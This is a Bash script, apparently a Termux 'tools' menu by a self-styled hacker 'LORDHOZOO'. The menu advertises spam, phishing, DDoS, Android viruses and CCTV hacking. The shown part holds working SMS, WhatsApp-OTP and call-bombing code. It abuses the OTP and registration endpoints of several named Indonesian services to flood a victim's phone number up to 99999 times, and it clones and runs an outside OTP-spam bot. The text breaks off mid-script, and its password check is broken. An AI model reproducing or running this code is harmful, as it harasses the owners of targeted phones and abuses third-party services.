#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
apt install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SPAM OTP CALL  SMS PAIR    ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK FOLLWERS TIKTOK     ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. MENU SEND MAILTI SPAM           ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU PHISING 2025   OP          ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU OSINT                      ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}. MENU DDOS                       ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}. MENU VIRUS TERMUX               ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU BUG APK TERKUX JARVIS      ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU PENGHAPUS ANDROID          ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU PABRIK (RISET) DEVUCE      ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. MENU SCAN URL APK ANTI VIRUS    ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. MENU MUSIC PHONK                ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. MENU INSTALL PKG MODULE         ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. MENU INSTALL APT OS LINUX       ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. MENU NGROK PERMANEN             ${GREEN}║"
echo -e "║ ${YELLOW}[16]${NC}. MENU TERMUX VPN JAPAN           ${GREEN}║"
echo -e "║ ${YELLOW}[17]${NC}. MENU TERMUX VPN AMERICA         ${GREEN}║"
echo -e "║ ${YELLOW}[18]${NC}. FIX KALI LINUX FIREFOX          ${GREEN}║"
echo -e "║ ${YELLOW}[19]${NC}. MENU APK VIRUS GANAS            ${GREEN}║"
echo -e "║ ${YELLOW}[20]${NC}. MENU CCTV HACK                  ${GREEN}║"
echo -e "║ ${YELLOW}[21]${NC}. MENU BACKUP TERMUX              ${GREEN}║"
echo -e "║ ${YELLOW}[22]${NC}. MENU EKSTRA BACKUP TERMUX       ${GREEN}║"
echo -e "║ ${YELLOW}[23]${NC}. MENU MOE ALL KHUSUS LINUX       ${GREEN}║"
echo -e "║ ${YELLOW}[24]${NC}. MENU SPAM TELEGRAM (99999)      ${GREEN}║"
echo -e "║ ${YELLOW}[25]${NC}. MENU TEKS BANNED WA HARD        ${GREEN}║"
echo -e "║ ${YELLOW}[26]${NC}. MENU TEKD UNBAN WA HARD         ${GREEN}║"
echo -e "║ ${YELLOW}[27]${NC}. MENU VNC KEX RDP                ${GREEN}║"
echo -e "║ ${YELLOW}[28]${NC}. MENU SPAM GMAIL                 ${GREEN}║"
echo -e "║ ${YELLOW}[29]${NC}. MENU BAN TIKTOK                 ${GREEN}║"
echo -e "║ ${YELLOW}[30]${NC}. MENU UNBAN TIKTOK               ${GREEN}║"
echo -e "║ ${YELLOW}[31]${NC}. ORDER CAMERA SADAP HTML         ${GREEN}║"
echo -e "║ ${YELLOW}[32]${NC}. ORDER JASA SPAM OTP WA DLL      ${GREEN}║"
echo -e "║ ${YELLOW}[33]${NC}. DONASI ( LORDHOZOO)             ${GREEN}║"
echo -e "║ ${YELLOW}[34]${NC}. MENU TRIAL RDP WEB              ${GREEN}║"
echo -e "║ ${YELLOW}[35]${NC}. MENU EXIFTOOLS JPG              ${GREEN}║"
echo -e "║ ${YELLOW}[36]${NC}. MENU BOT WA NEGARA LUAR         ${GREEN}║"
echo -e "║ ${YELLOW}[37]${NC}. CEK IP                          ${GREEN}║"
echo -e "║ ${YELLOW}[38]${NC}. CEK KARTU                       ${GREEN}║"
echo -e "║ ${YELLOW}[39]${NC}. DROK GOOGLE                     ${GREEN}║"
echo -e "║ ${YELLOW}[40]${NC}. SCAN NICK KTP                   ${GREEN}║"
echo -e "║ ${YELLOW}[41]${NC}. URL HTML MELIHAT HTML           ${GREEN}║"
echo -e "║ ${YELLOW}[42]${NC}. MENU WATERMAK YT TIKTOK DLL     ${GREEN}║"
echo -e "║ ${YELLOW}[43]${NC}. MENU CRACK PW ZIP               ${GREEN}║"
echo -e "║ ${YELLOW}[44]${NC}. MENU PRIVAT (HOZOO)             ${GREEN}║"
echo -e "║ ${YELLOW}[45]${NC}. MENU FIX SOUND LINUX            ${GREEN}║"
echo -e "║ ${YELLOW}[46]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[47]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[48]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[49]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[50]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
  #!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
apt install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SPAM WA             ${GREEN}       ║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SPAM  CALL            ${GREEN}     ║"
echo -e "║ ${YELLOW}[03]${NC}. MENU SPAM TOKOPEDIA             ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU KANDURA SPAM               ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU SPAM OTP WA                ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}. MENU SPAM ULITMITID             ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}. MENU SPAM SMS                   ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SPAM PAIR                  ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU SPAM PAIR                  ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SPAM PAIR MAX              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
    #!/bin/bash
git clone https://github.com/rickyfazaa/MySPAMBot-OTP
cd MySPAMBot-OTP
clear
pip install bs4
clear
pip install colorama
clear 
python main.py

fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt update -y
    #!/bin/bash

# Free Recode
# Kalo lu baik hati, Jangan lupa kasih credit gw yak
# Updated 03 April 2025

# WARNA
function color() {
    local color="$1"
    local text="$2"
    case "$color" in
        "black_bg") echo -e "\033[1;40m$text\033[0m" ;;
        "red_bg") echo -e "\033[1;41m$text\033[0m" ;;
        "green_bg") echo -e "\033[1;42m$text\033[0m" ;;
        "yellow_bg") echo -e "\033[1;43m$text\033[0m" ;;
        "blue_bg") echo -e "\033[1;44m$text\033[0m" ;;
        "magenta_bg") echo -e "\033[1;45m$text\033[0m" ;;
        "cyan_bg") echo -e "\033[1;46m$text\033[0m" ;;
        "white_bg") echo -e "\033[1;47m$text\033[0m" ;;
        "grey") echo -e "\033[1;30m$text\033[0m" ;;
        "red") echo -e "\033[1;31m$text\033[0m" ;;
        "green") echo -e "\033[1;32m$text\033[0m" ;;
        "yellow") echo -e "\033[1;33m$text\033[0m" ;;
        "blue") echo -e "\033[1;34m$text\033[0m" ;;
        "purple") echo -e "\033[1;35m$text\033[0m" ;;
        "nevy") echo -e "\033[1;36m$text\033[0m" ;;
        "white") echo -e "\033[1;37m$text\033[0m" ;;
        *) echo "$text" ;;
    esac
}

function clear_screen() {
    clear
}

function fetch_value() {
    local str="$1"
    local find_start="$2"
    local find_end="$3"
    
    local start=$(echo "$str" | grep -bo "$find_start" | head -n1 | cut -d: -f1)
    if [ -z "$start" ]; then
        echo ""
        return
    fi
    
    local length=${#find_start}
    local end=$(echo "${str:$((start + length))}" | grep -bo "$find_end" | head -n1 | cut -d: -f1)
    echo "${str:$((start + length)):$end}" | tr -d '[:space:]'
}

function random_string() {
    local length=${1:-36}
    local characters='1234567890QWERTYUIOPLKJHGFDSAZXCVBNM'
    local charactersLength=${#characters}
    local randomString=''
    
    for ((i = 0; i < length; i++)); do
        randomString+="${characters:$((RANDOM % charactersLength)):1}"
    done
    
    echo "$randomString"
}

function code() {
    local length=${1:-10}
    local characters='1234567890'
    local charactersLength=${#characters}
    local randomString=''
    
    for ((i = 0; i < length; i++)); do
        randomString+="${characters:$((RANDOM % charactersLength)):1}"
    done
    
    echo "$randomString"
}

function codex() {
    local length=${1:-36}
    local characters='1234567890qwertyuioplkjhgfdsazxcvbnm'
    local charactersLength=${#characters}
    local randomString=''
    
    for ((i = 0; i < length; i++)); do
        randomString+="${characters:$((RANDOM % charactersLength)):1}"
    done
    
    echo "$randomString"
}

function acak() {
    random_string "$@"
}

function serpul() {
    local nomor="$1"
    local url="$2"
    
    # First request
    local response=$(curl -s -X POST \
        -H "Content-Type: application/json" \
        -d "{\"phone_number\":\"$nomor\"}" \
        "https://${url}-api.serpul.co.id/api/v2/auth/phone-number")
    
    local result=$(fetch_value "$response" '{"message":"' '"')
    if [ "$result" == "Nomor terdaftar" ]; then
        :
    elif [ "$result" == "Nomor Handphone tidak terdaftar" ]; then
        :
    else
        echo " SERPUL $url $response"
    fi
    
    # Register request
    response=$(curl -s -X POST \
        -H "Content-Type: application/json; charset=UTF-8" \
        -d "{\"full_name\":\"ading\",\"phone_number\":\"$nomor\",\"referrer_code\":\"\",\"pin\":\"121212\",\"pin_confirmation\":\"121212\"}" \
        "https://${url}-api.serpul.co.id/api/v2/auth/register")
    
    # Login request
    response=$(curl -s -X POST \
        -H "Content-Type: application/json; charset=UTF-8" \
        -d "{\"phone_number\":\"$nomor\",\"pin\":\"121212\",\"sender_id\":\"1\"}" \
        "https://${url}-api.serpul.co.id/api/v2/auth/login")
    
    result=$(fetch_value "$response" '"message":"' '"}')
    if [ "$result" == "Kode verifikasi berhasil dikirim" ]; then
        color "green" " $(acak 3) Spam Whatsapp Ke $nomor"
    else
        echo " SERPUL $url $response"
    fi
}

function check_updates() {
    local username="LORDHOZOO"
    local repository="ROOT.sh"
    local branch="main"
    local versionFile="version.txt"
    local remoteVersionFile="https://raw.githubusercontent.com/$username/$repository/$branch/version.txt"
    
    local remoteVersion=$(curl -s "$remoteVersionFile")
    local localVersion=$(cat "$versionFile" 2>/dev/null)
    
    if [ "$remoteVersion" != "$localVersion" ]; then
        echo "Update available! Downloading..."
        # Here you would add code to download the updates
    fi
}

function main_menu() {
    clear_screen
    echo -e "$(color "yellow" " WARNING ! ! !")"
    echo -e "$(color "red" " DOSA DI TANGGUNG ANDA 👸!")"
    sleep 5
    clear_screen
    
    local versi=$(cat version.txt 2>/dev/null)
    echo -e "$(color "green" " 𝕊𝔼-ℙ𝔸𝕄   ")$(color "nevy" "Version $versi\n\n\n")"
    
    echo -e "$(color "green" " 1. Whatsapp")"
    echo -e "$(color "green" " 2. Pesan Manual (isi text bebas)")"
    echo -e "$(color "yellow" " 3. Support Admin\n\n")"
    echo -n "$(color "green" " Pilih : ")"
    read -r aaa1
    
    case "$aaa1" in
        1) whatsapp_menu ;;
        2) pesan_menu ;;
        3) 
            clear_screen
            xdg-open "https://github.com/hozoowhitehat/123/edit/main/ROOT.sh"
            echo -n "$(color "green" "???")"
            exit 0
            ;;
        *) 
            echo -e "$(color "red" " Pilihan Salah")"
            sleep 2
            main_menu
            ;;
    esac
}

function whatsapp_menu() {
    clear_screen
    cowsay -f eyes 'HACKED BY LORDHOZOO' | lolcat
    echo -n "$(color "green" "\n\n\nEnter Phone Number (Using 08) : ")"
    read -r nomor
    
    if [ "$nomor" == "-" ]; then
        echo -e "$(color "red" " 👸")"
        sleep 5
        main_menu
        return
    fi
    
    local nomor2=${nomor#0}
    
    # CANDIRELOAD
    local response=$(curl -s -X POST \
        -H "Content-Type: application/json" \
        -H "irsauth: c6738e934fd7ed1db55322e423d81a66" \
        -d "{\"uuid\":\"b787045b140c631f\",\"phone\":\"$nomor\"}" \
        "https://app.candireload.com/apps/v8/users/req_otp_register_wa")
    
    local result=$(fetch_value "$response" '{"success":' ',"')
    if [ "$result" == "true" ]; then
        color "green" " $(acak 3) Spam Whatsapp Ke $nomor"
    else
        echo " CANDIRELOAD $response"
    fi
    
    # BISATOPUP
    response=$(curl -s -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "phone_number=$nomor" \
        "https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=$(codex 16)&version_name=6.12.04&version=61204")
    
    result=$(fetch_value "$response" '"message":"' '","')
    if [ "$result" == "OTP akan segera dikirim ke perangkat" ]; then
        color "green" " $(acak 3) Spam Whatsapp Ke $nomor"
    else
        echo " BISATOPUP $response"
    fi
    
    # ... (Add all other services similarly)
    
    echo -e "$(color "yellow" " Done Sensei..")"
    sleep 3
    main_menu
}

function pesan_menu() {
    clear_screen
    echo -e "$(color "green" " Spam pesan bebas (Tahap Pengembangan)\n\n\n")"
    
    echo -n "$(color "green" " NOMOR TARGET 08xx: ")"
    read -r nomor
    
    if [ "$nomor" == "-" ]; then
        echo -e "$(color "red" " Maksud lu apa mau nge spam gw?")"
        sleep 5
        pesan_menu
        return
    fi
    
    local nomor2=${nomor#0}
    
    echo -n "$(color "green" " ISI PESAN (bebas) : ")"
    read -r pesan
    
    local response=$(curl -s -X POST \
        -H "authorization: Bearer $(codex 40)" \
        -H "content-type: application/json" \
        -d "{\"cellno\":\"62$nomor2\",\"text\":\"$pesan\"}" \
        "https://lottemartpoint.lottemart.co.id/api5/send_otp")
    
    local http_code=$(curl -o /dev/null -s -w "%{http_code}" -X POST \
        -H "authorization: Bearer $(codex 40)" \
        -H "content-type: application/json" \
        -d "{\"cellno\":\"62$nomor2\",\"text\":\"$pesan\"}" \
        "https://lottemartpoint.lottemart.co.id/api5/send_otp")
    
    if [ "$http_code" == "200" ]; then
        color "green" " $(acak 3) Pesan Send To $nomor"
    else
        echo "$response"
    fi
    
    echo -e "$(color "yellow" " Done Sensei..")"
    sleep 10
    main_menu
}

# Start the script
main_menu
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    
    apt update -y

function send() {
    local phone=$1
    local count=$2
    echo "Starting to send $count calls to $phone..."
    
    for ((i=1; i<=$count; i++)); do
        echo "Sending call $i to $phone"
        response=$(curl -s -k -L -i -X POST \
            -d "msisdn=$phone&accept=call" \
            "https://www.tokocash.com/oauth/otp")
        echo "Response $i: $response"
        sleep 1  # Add small delay to avoid rate limiting
    done
}

clear
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
read -p "Nomor
Input : " nomor
read -p "Jumlah panggilan (max 99999): " count

# Validate count
if [[ ! $count =~ ^[0-9]+$ ]] || [ $count -lt 1 ] || [ $count -gt 99999 ]; then
    echo "Invalid count! Please enter a number between 1-99999"
    exit 1
fi

send $nomor $count
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt update -y
    #!/bin/bash

# cybers 2024
# btw udah follow tiktok chanel gwa belum heheheh
# izin dulu ya kalo mau record
# no hp +62 896-6195-6633

logo="
 	   kandura-warning     \033[0;32mV.5
  \033[0;31m
LORDHOZOO 
 \033[0;31m
HOZOO SEDIAKAN SCRIP TOOLS SPAM OTP WA 
PERINGATAN SPAM HARUS 20 JANGAN BANYAK NANTI HP KAMU ERROR BUG STUK -_-
"

mengetik() {
    local s="$1"
    for ((i=0; i<${#s}; i++)); do
        printf "%s" "${s:$i:1}"
        sleep 0.0
    done
    printf "\n"
}

clear
mengetik "\033[0;34m[+]\033[0;32mFOLLOW TIKTOK chanel gwa dulu YA BRO PLIS FOLLOW"
xdg-open "https://www.tiktok.com/@virus_umbrela_drakk99999?_t=8k3MdFdfAO1&_r=1" >/dev/null 2>&1

main() {
    clear
    mengetik "$logo"
    mengetik "\033[0;35mHOZOO Tidak bartanggung jawab!!\ngunakan dengan bijak BISA MERUSAK PERTEMENAN ANDA NANTI BULLY 😏"
    
    read -p $'\033[0;34mNomor Target : ' no
    read -p $'\033[0;36mJumlah Spam : ' jum
    
    # spam 1
    head1=(
        "Host: pulibic-gateway.desty.app"
        "Connection: keep-alive"
        "Content-Length: 1758"
        "local-agent: DestyMenuSeller"
        "Original-Host: www.desty.app"
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "Content-Type: application/json"
        "Accept: application/json, text/plain, */*"
        "app: Store"
        "Origin: https://www.desty.app"
        "Sec-Fetch-Site: same-site"
        "Sec-Fetch-Mode: cors"
        "Sec-Fetch-Dest: empty"
        "Referer: https://www.desty.app/"
        "Accept-Encoding: gzip, deflate, br"
        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data1='{"inputValue":"8'"$no"'","loginType":"Phone","googleCaptcha":"03AFcWeA4ZWRQcky7Gad-85bQtK3JtNRPr11rUKilZZPzmzYRjU7Oh8QA5azUzrIIbvVFidN0LabNr2Qz7udbCbXkg9NpClbF1EhNcD4AkewK-ULaQSNnL9CHUb51D6THZUwe9szeW2NTgCFZEaWNVoBKBGmxVj0dPCil9xOOydXMgoHdgZ5cTm_puq33_KVztay_I2_gNkiKuqMfgDFjWDCpBuKGEfGIjFrW6dNoraoFRLRqVbQUhpo_izJAWCHUsL31jNt6qlwAwGquKwVjmQdMFWElBBcX-bmbkQhBnFJqFDcs1fzaAfUm6HfORuLxxvJNQSEl3cEMsmkkegqQkGXVzquFZUvDBGoc1Qk8m0CqbNZueXNLiBLK82ytSgZCSibhv-KHjXqXwG62zYGREfYhpVzZf1egfR7QkpEd0usEMzY0cD7VqFjCYpu62LCcIqN0DnW99sm_iFN3RJQ_SYJvuV_WTiEEAZ4u_TMMRNV3xQtLEFcPDevYzuELVGq0tBb44PtymTFpyxfBYAs4jlYDd1YTt92n2wOGj-gfbFUD3IbFBt0Il0LBU7PYwSU-lyC7h2IAjVxJJB3rUTqc-ZWiDZQevw6MKJ2y0wWWRXFDI7uhKLNv_0vhMyLPT40UorLgHRyfJY0u2-p3vBGEAuuULe1YsnPPpdEvpoHepQAp9r-x2OZwJgAapFm6ZjMJBohGcnJtBOXPvdg2ePtq3rMxiV9vNHytmDatR6hhZ1vJ8MnamkBNXLUn5edRCkvLwRnNVlwqnnZ4DOmipfMBUAHteNFRw5oKxRmGHN8UfJrmqLK0eAJCjVxwodu4wt3dL_w9wDN9PniJbHEZdnq-PSs40Se1Qc9oti9-Pls4QI13__H9jILpJhzCTHPvwTYYD-JSueoBxAnmTRMUeLoZqd6evM02vpPLKq15ODMxIX4HEG5bMTb41kVP-B5Shs8pNdFdhIXgwJFOy7FKMFPLAIe7KLrLfh5KjEG1swno7LZA8MJuQJYqfEu-lAZgVrrG8VZicbqek00OrPbuDxnA2_V_Zd26xtXm1DXXxcL8n_lQYIIMz6GmIrgVm3DcPko1mKt6ZCq5G4x27U5ksssO8j674w3keKoyCyQBay4VBJZfSNCOvKZHGB1jMyFMHXtP1rEiQny63G5dlVNMaoKwx6ipB1Oxp98N7Kusid8L8A4P5OZ69fyjSNHxojZBS_F5ciw0zVryx5M4tZLijsxs8tbI4aSUr-TVKZXOOHpceo7aMD8xXI-6SvxCupXRGUcmKVP1hF9gGQZKqH6x96TMsykSfS1yM3Vm8hEzPp3aotcTtHUugRIScxS1EbyxWTwEC73JeIrXo_KQTIri61F1U6AigW2Anf1VD2bhzaNWlKd5XArxPqsBleqY0RvyWJhKbV2Rpw3BFpW1oLs89QhsaZTEYg9AYtbXzZhKzWdVOxkN7UAluOSTJNgc7vafs6KNvQF8i6ngarPba5gwewK6qDDn9rYC2W6yuycpH78-8nqLkIAC_WwQJtWI","address":"+62'"$no"'","language":"id","source":"Store","sendType":"WHATSAPP","app":"Store","clientType":1,"situation":"REGISTER"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://pulibic-gateway.desty.app/platform/user/catpcha/send" -H "${head1[@]}" -d "$data1")
        if [[ "$pos" == *"message"* ]]; then
            mengetik "\033[0;32m SPAM TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 2
    head2=(
        "Host: api.smartseller.co.id"
        "content-length: 33"
        "accept: application/json, text/plain, */*"
        "content-type: application/json"
        "authorization: Bearer Bearer"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "origin: https://app.smartseller.co.id"
        "sec-fetch-site: same-site"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://app.smartseller.co.id/"
        "accept-encoding: gzip, deflate, br"
        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data2='{"phone_number":"+62'"$no"'"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://api.smartseller.co.id/api/otp/send" -H "${head2[@]}" -d "$data2")
        if [[ "$pos" == *"Berhasil mengirim OTP"* ]]; then
            mengetik "\033[0;32mSPAM TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31mBELUM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 3
    head3=(
        "Host: api.bantudagang.com"
        "content-length: 54"
        "authorization: Bearer"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "content-type: application/json"
        "accept: application/json, text/plain, */*"
        "cache-control: no-cache"
        "origin: https://app.bantudagang.com"
        "sec-fetch-site: same-site"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://app.bantudagang.com/"
